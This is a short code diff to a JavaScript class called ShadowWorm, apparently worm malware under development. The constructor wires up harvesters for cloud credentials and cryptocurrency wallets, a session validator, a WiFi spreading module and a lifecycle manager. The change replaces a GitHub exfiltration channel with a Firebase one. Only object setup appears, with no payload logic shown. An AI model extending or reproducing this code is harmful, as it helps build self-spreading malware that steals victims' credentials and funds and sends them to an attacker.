@@ -589,7 +589,7 @@ class ShadowWorm {
     this.cloudHarvester = new CloudCredentialHarvester();
     this.cryptoHarvester = new CryptoWalletHarvester();
     this.sessionValidator = new SessionValidator();
-    this.githubExfiltrator = new GitHubExfiltrator(this.config);
+    this.firebaseExfiltrator = new FirebaseExfiltrator(this.config);
     this.wifiSpreader = new WiFiSpreader();
     this.lifecycle = new LifecycleManager(this.config);
   }
